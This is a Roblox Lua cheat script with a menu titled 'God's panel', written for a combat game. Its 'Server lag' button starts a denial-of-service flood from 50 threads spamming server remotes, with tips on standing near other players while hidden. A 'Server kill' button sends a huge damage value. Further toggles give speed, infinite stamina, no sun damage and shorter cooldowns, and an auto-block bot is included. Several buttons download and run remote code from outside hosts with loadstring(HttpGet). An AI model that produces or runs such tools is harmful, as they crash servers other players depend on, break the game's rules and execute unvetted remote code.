print("[========= ( The loading was successful. The script is running. ) =========]")
local ReplicatedStorage=game:GetService("ReplicatedStorage")
local Players=game:GetService("Players")
local RunService=game:GetService("RunService")
local TeleportService=game:GetService("TeleportService")
local UserInputService=game:GetService("UserInputService")
local LocalPlayer=Players.LocalPlayer
local Rayfield=loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
local INVOKE_THREADS=50
local speedMultiplier=1
local currentTrueSpeed=16.80
local isModifyingSpeed=false
local noSunDamageEnabled=false
local scytheLowCD=false
local swampLowCD=false
local willLowCD=false
local infinityStaminaEnabled=false
local infinityStaminaThread=nil
local originalCooldowns={}
local scytheSkills={Asteroid=true,Bloodlust=true}
local swampSkills={["Swamp Puddle"]=true,["Traveling Claws"]=true,["Swamp Eject"]=true,["Swamp Trap"]=true,["Self Replication"]=true,["Swamp Domain"]=true}
local willSkills={["Indomitable Will"]=true}
local origStamina,origStamBreath,origRemoveStam,origAddStam=nil,nil,nil,nil
local function setupSpeedHook(character)
local humanoid=character:WaitForChild("Humanoid",5)
if not humanoid then return end
humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
if isModifyingSpeed then return end
currentTrueSpeed=humanoid.WalkSpeed
if speedMultiplier~=1 then
isModifyingSpeed=true
humanoid.WalkSpeed=currentTrueSpeed*speedMultiplier
isModifyingSpeed=false
end
end)
end
task.spawn(function()
while true do
if noSunDamageEnabled then
local pValues=ReplicatedStorage:FindFirstChild("PlayerValues")
local myValues=pValues and pValues:FindFirstChild(LocalPlayer.Name)
if myValues and not myValues:FindFirstChild("No_Sun_Damage") then
local boolVal=Instance.new("BoolValue")
boolVal.Name="No_Sun_Damage"
boolVal.Value=true
boolVal.Parent=myValues
end
end
task.wait(0.5)
end
end)
task.spawn(function()
while true do
pcall(function()
local powerAdder=LocalPlayer.PlayerGui:FindFirstChild("Power_Adder")
if powerAdder then
for _,desc in ipairs(powerAdder:GetDescendants()) do
if desc.Name=="CoolDown" and desc:IsA("ValueBase") then
local skillName=desc.Parent.Name
if scytheSkills[skillName] then
if scytheLowCD then
if not originalCooldowns[desc] then originalCooldowns[desc]=desc.Value end
local targetVal=originalCooldowns[desc]*0.5
if desc.Value~=targetVal then desc.Value=targetVal end
else
if originalCooldowns[desc] then
if desc.Value~=originalCooldowns[desc] then desc.Value=originalCooldowns[desc] end
originalCooldowns[desc]=nil
end
end
elseif swampSkills[skillName] then
if swampLowCD then
if not originalCooldowns[desc] then originalCooldowns[desc]=desc.Value end
local targetVal=originalCooldowns[desc]*0.5
if desc.Value~=targetVal then desc.Value=targetVal end
else
if originalCooldowns[desc] then
if desc.Value~=originalCooldowns[desc] then desc.Value=originalCooldowns[desc] end
originalCooldowns[desc]=nil
end
end
elseif willSkills[skillName] then
if willLowCD then
if not originalCooldowns[desc] then originalCooldowns[desc]=desc.Value end
local targetVal=originalCooldowns[desc]*0.5
if desc.Value~=targetVal then desc.Value=targetVal end
else
if originalCooldowns[desc] then
if desc.Value~=originalCooldowns[desc] then desc.Value=originalCooldowns[desc] end
originalCooldowns[desc]=nil
end
end
end
end
end
end
end)
task.wait(0.3)
end
end)
if LocalPlayer.Character then
task.spawn(setupSpeedHook, LocalPlayer.Character)
end
LocalPlayer.CharacterAdded:Connect(function(char)
currentTrueSpeed=16.80
setupSpeedHook(char)
end)
if not game:IsLoaded() then game.Loaded:Wait() end
task.wait(5)
local combatRemote=ReplicatedStorage.Remotes.To_Server.Handle_Initiate_S
local invokeRemote=nil
pcall(function()
invokeRemote=ReplicatedStorage.Remotes.To_Server.Handle_Initiate_S_
end)
local lanternHandlers={}
for _,name in pairs({
"Lantern_Handler",
"Box_Lantern_Handler",
"Old_Lantern_Handler",
"Lantern_Of_Despair_Handler",
"Lantern_Of_Everlasting_Glow_Handler"
}) do
pcall(function()
local r=ReplicatedStorage.Remotes:FindFirstChild(name)
if r then table.insert(lanternHandlers,r) end
end)
end
local lanternTools={}
for _,name in pairs({
"Lantern",
"Box Lantern",
"Old Lantern",
"Lantern Of Despair",
"Lantern Of Everlasting Glow"
}) do
pcall(function()
local t=ReplicatedStorage.Tools:FindFirstChild(name)
if t then table.insert(lanternTools,t) end
end)
end
local toolsData=nil
pcall(function()
local pd=ReplicatedStorage.Player_Data:WaitForChild(LocalPlayer.Name,5)
if pd then toolsData=pd:FindFirstChild("tools_thing123") end
end)
local isActive=false
local function invokeFlood()
if not invokeRemote then return end
for i=1,INVOKE_THREADS do
task.spawn(function()
while isActive do
pcall(function()
invokeRemote:InvokeServer("Change_Value",nil,true)
end)
pcall(function()
invokeRemote:InvokeServer("Change_Value",nil,false)
end)
end
end)
if i%10==0 then task.wait() end
end
end
local function lanternCycle()
task.spawn(function()
pcall(function()
while isActive do
for _,handler in pairs(lanternHandlers) do
for _,tool in pairs(lanternTools) do
pcall(function() handler:FireServer(2,tool) end)
pcall(function() handler:FireServer(1,tool) end)
end
end
RunService.RenderStepped:Wait()
end
end)
end)
end
local function changeValueFlood()
if not toolsData then return end
task.spawn(function()
pcall(function()
local vals=toolsData:GetChildren()
while isActive do
for _,v in pairs(vals) do
pcall(function() combatRemote:FireServer("Change_Value",v,true) end)
pcall(function() combatRemote:FireServer("Change_Value",v,false) end)
end
RunService.RenderStepped:Wait()
end
end)
end)
end
local function fireCrash()
if isActive then return end
isActive=true
print("LANTERN ATTACK")
invokeFlood()
lanternCycle()
changeValueFlood()
end
local Window=Rayfield:CreateWindow({
Name="God's panel.",
LoadingTitle="Loading...",
LoadingSubtitle="Closed.",
Theme="Dark",
ConfigurationSaving={Enabled=false,},
})
local ServerTab=Window:CreateTab("Server",4483362458)
ServerTab:CreateSection("Server damage")
ServerTab:CreateButton({
Name="Server lag",
Info = "I advise you to hide as players will be able to see the lantern in your hand. It is worth getting as close to the players as possible, following 1 tip.",
Callback=function()
fireCrash()
end,
})
ServerTab:CreateButton({
Name="Server kill",
Info = "It's not working at the moment.",
Callback=function()
game:GetService("ReplicatedStorage").Remotes.To_Server.Handle_Initiate_S:FireServer("skil_ting_asd",game:GetService("Players").LocalPlayer,"thunderbreathingricespirit",5)
local args={
[1]="ricespiritdamage",
[2]=game.Players.LocalPlayer.Character,
[3]=CFrame.new(-362.2265930175781,425.482421875,-2354.545166015625,0.32892149686813354,0.024535520002245903,0.9440385103225708,1.0956046736509961e-07,0.999662458896637,-0.025981221348047256,-0.9443572759628296,0.008545885793864727,0.328810453414917),
[4]=99999999999999999999999
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("To_Server"):WaitForChild("Handle_Initiate_S"):FireServer(unpack(args))
task.wait(1.5)
module:Teleport(game.PlaceId)
end,
})
ServerTab:CreateSection("Misc")
ServerTab:CreateButton({
Name="Rejoin",
Callback=function()
local placeId=game.PlaceId
local jobId=game.JobId
if placeId and jobId and #jobId>0 then
TeleportService:TeleportToPlaceInstance(placeId,jobId)
end
end,
})
local LocalTab=Window:CreateTab("Local",4483362458)
LocalTab:CreateSection("Character")
LocalTab:CreateSlider({
Name="WalkSpeed Override",
Range={16,200},
Increment=1,
CurrentValue=16,
Flag="WalkSpeedSlider",
Callback=function(Value)
if Value==16 then
speedMultiplier=1
else
speedMultiplier=Value/16
end
local character=LocalPlayer.Character
local humanoid=character and character:FindFirstChildOfClass("Humanoid")
if humanoid then
isModifyingSpeed=true
humanoid.WalkSpeed=currentTrueSpeed*speedMultiplier
isModifyingSpeed=false
end
end,
})
LocalTab:CreateButton({
Name="Reset WalkSpeed",
Callback=function()
speedMultiplier=1
local character=LocalPlayer.Character
local humanoid=character and character:FindFirstChildOfClass("Humanoid")
if humanoid then
isModifyingSpeed=true
humanoid.WalkSpeed=currentTrueSpeed
isModifyingSpeed=false
end
end,
})
LocalTab:CreateToggle({
Name="No Sun Damage",
CurrentValue=false,
Flag="NoSunDamageToggle",
Callback=function(Value)
noSunDamageEnabled=Value
if not Value then
local pValues=ReplicatedStorage:FindFirstChild("PlayerValues")
local myValues=pValues and pValues:FindFirstChild(LocalPlayer.Name)
local target=myValues and myValues:FindFirstChild("No_Sun_Damage")
if target then
target:Destroy()
end
end
end,
})
LocalTab:CreateToggle({
Name="Infinity Stamina",
CurrentValue=false,
Flag="InfinityStaminaToggle",
Callback=function(Value)
infinityStaminaEnabled=Value
if Value then
origStamina=_G.Stamina
origStamBreath=_G.StamBreath
origRemoveStam=_G.RemoveStam
origAddStam=_G.AddStamina
_G.Stamina=function(a,b) return true end
_G.StamBreath=function(a,b,c) return true end
_G.RemoveStam=function(a,b) end
_G.AddStamina=function(a,b) end
if not infinityStaminaThread then
infinityStaminaThread=task.spawn(function()
local player=Players.LocalPlayer
local staminaObj=ReplicatedStorage:WaitForChild("PlayerValues"):WaitForChild(player.Name):WaitForChild("Stamina")
while infinityStaminaEnabled do
RunService.RenderStepped:Wait()
if staminaObj and staminaObj.Value<staminaObj.MaxValue then
staminaObj.Value=staminaObj.MaxValue
end
end
end)
end
else
infinityStaminaEnabled=false
if infinityStaminaThread then
task.cancel(infinityStaminaThread)
infinityStaminaThread=nil
end
if origStamina then _G.Stamina=origStamina end
if origStamBreath then _G.StamBreath=origStamBreath end
if origRemoveStam then _G.RemoveStam=origRemoveStam end
if origAddStam then _G.AddStamina=origAddStam end
end
end,
})
LocalTab:CreateSection("Cooldown")
LocalTab:CreateToggle({
Name="Scythe low cooldown",
CurrentValue=false,
Flag="ScytheCDToggle",
Callback=function(Value)
scytheLowCD=Value
end,
})
LocalTab:CreateToggle({
Name="Swamp low cooldown",
CurrentValue=false,
Flag="SwampCDToggle",
Callback=function(Value)
swampLowCD=Value
end,
})
LocalTab:CreateToggle({
Name="Hashibira clan will low cooldown",
CurrentValue=false,
Flag="ClanWillCDToggle",
Callback=function(Value)
willLowCD=Value
end,
})
local AnotherTab=Window:CreateTab("Another",4483362458)
AnotherTab:CreateSection("Frosties ")
AnotherTab:CreateButton({
Name="Launch",
Callback=function()
loadstring(game:HttpGet("https://getfrosties.com/Frosties.luau"))();
end,
})
AnotherTab:CreateSection("Infinity Yeld")
AnotherTab:CreateButton({
Name="Launch",
Callback=function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end,
})
AnotherTab:CreateSection("Auto-Block")
AnotherTab:CreateButton({
Name="Launch",
Callback=function()
local vim=game:GetService("VirtualInputManager")
local Players=game:GetService("Players")
local ReplicatedStorage=game:GetService("ReplicatedStorage")
local player=Players.LocalPlayer
local movesFolder=ReplicatedStorage:WaitForChild("Animations"):WaitForChild("Moves")
local clientModulesFolder=player:WaitForChild("PlayerScripts"):WaitForChild("Client_Modules"):WaitForChild("Modules")
local handleInitiateC=ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("To_Client"):WaitForChild("Handle_Initiate_C")
local skillAnimationIds={}
local skillAnimationNames={}
local startupModuleNames={}
local maxDistance=44
local handledTracks={}
local handledSignals={}
local isPressing=false
local function normalizeAnimationId(animationId)
local value=tostring(animationId or "")
return value:match("%d+") or ""
end
local function cacheSkillAnimation(instance)
if not instance:IsA("Animation") then return end
local animationId=normalizeAnimationId(instance.AnimationId)
if animationId~="" then skillAnimationIds[animationId]=true end
local name=string.lower(instance.Name or "")
if name~="" then skillAnimationNames[name]=true end
end
local function cacheStartupModule(instance)
if not instance:IsA("ModuleScript") then return end
local name=string.lower(instance.Name or "")
if name:find("startup",1,true) or name:match("start%d*$") then
startupModuleNames[name]=true
end
end
for _,instance in ipairs(movesFolder:GetDescendants()) do cacheSkillAnimation(instance) end
movesFolder.DescendantAdded:Connect(cacheSkillAnimation)
for _,instance in ipairs(clientModulesFolder:GetDescendants()) do cacheStartupModule(instance) end
clientModulesFolder.DescendantAdded:Connect(cacheStartupModule)
local function isCharacterModel(instance)
return instance and instance:IsA("Model") and instance:FindFirstChild("HumanoidRootPart") and instance:FindFirstChildOfClass("Humanoid")
end
local function extractCharacter(value)
local valueType=typeof(value)
if valueType=="Instance" then
if isCharacterModel(value) then return value end
local model=value:FindFirstAncestorOfClass("Model")
if isCharacterModel(model) then return model end
elseif valueType=="table" then
local character=rawget(value,"Character") or rawget(value,"character")
if typeof(character)=="Instance" and isCharacterModel(character) then return character end
for _,nestedValue in pairs(value) do
local nestedCharacter=extractCharacter(nestedValue)
if nestedCharacter then return nestedCharacter end
end
end
end
local function isAbilityTrack(track)
local animation=track.Animation
if animation then
local animationId=normalizeAnimationId(animation.AnimationId)
if animationId~="" and skillAnimationIds[animationId] then return true end
end
local name=string.lower(track.Name or "")
return name~="" and skillAnimationNames[name]==true
end
local function getNearestEnemyCharacter(myRoot)
local nearestCharacter=nil
local nearestDistance=math.huge
for _,enemy in ipairs(Players:GetPlayers()) do
if enemy~=player then
local enemyChar=enemy.Character
local enemyRoot=enemyChar and enemyChar:FindFirstChild("HumanoidRootPart")
local enemyHumanoid=enemyChar and enemyChar:FindFirstChildOfClass("Humanoid")
if enemyRoot and enemyHumanoid and enemyHumanoid.Health>0 then
local distance=(myRoot.Position-enemyRoot.Position).Magnitude
if distance<nearestDistance then
nearestDistance=distance
nearestCharacter=enemyChar
end
end
end
end
return nearestCharacter,nearestDistance
end
local function press_F()
if isPressing then return end
isPressing=true
task.spawn(function()
pcall(function()
vim:SendKeyEvent(true,Enum.KeyCode.F,false,game)
task.wait(0.6)
vim:SendKeyEvent(false,Enum.KeyCode.F,false,game)
end)
isPressing=false
end)
end
local function cleanupHandledTracks()
for track in pairs(handledTracks) do
local isPlaying=false
pcall(function() isPlaying=track.IsPlaying end)
if not isPlaying then handledTracks[track]=nil end
end
end
local function cleanupHandledSignals()
local now=os.clock()
for key,timestamp in pairs(handledSignals) do
if now-timestamp>2 then handledSignals[key]=nil end
end
end
local function tryBlockNearestCharacter(sourceCharacter,signalName)
if not sourceCharacter or sourceCharacter==player.Character then return end
local character=player.Character
local root=character and character:FindFirstChild("HumanoidRootPart")
local sourceRoot=sourceCharacter:FindFirstChild("HumanoidRootPart")
if not root or not sourceRoot then return end
local nearestCharacter,nearestDistance=getNearestEnemyCharacter(root)
if nearestCharacter~=sourceCharacter or nearestDistance>maxDistance then return end
local signalKey=string.format("%s:%s",sourceCharacter:GetDebugId(),signalName)
if handledSignals[signalKey] then return end
handledSignals[signalKey]=os.clock()
press_F()
end
handleInitiateC.OnClientEvent:Connect(function(signalName,...)
local name=string.lower(tostring(signalName or ""))
if not startupModuleNames[name] then return end
local sourceCharacter=nil
for index=1,select("#",...) do
sourceCharacter=extractCharacter(select(index,...))
if sourceCharacter then break end
end
tryBlockNearestCharacter(sourceCharacter,name)
end)
task.spawn(function()
while true do
pcall(function()
cleanupHandledTracks()
cleanupHandledSignals()
local character=player.Character
local root=character and character:FindFirstChild("HumanoidRootPart")
if not root then return end
local nearestCharacter,nearestDistance=getNearestEnemyCharacter(root)
if not nearestCharacter or nearestDistance>maxDistance then return end
local nearestHumanoid=nearestCharacter:FindFirstChildOfClass("Humanoid")
if not nearestHumanoid then return end
for _,track in ipairs(nearestHumanoid:GetPlayingAnimationTracks()) do
if isAbilityTrack(track) and not handledTracks[track] then
handledTracks[track]=true
press_F()
break
end
end
end)
task.wait(0.010)
end
end)
print("[========= ( Autoblock=? Loaded. ) =========]")
end,
})
print("[========= ( The launch is successful. Deсro conveys a pleasant game! ) =========]")
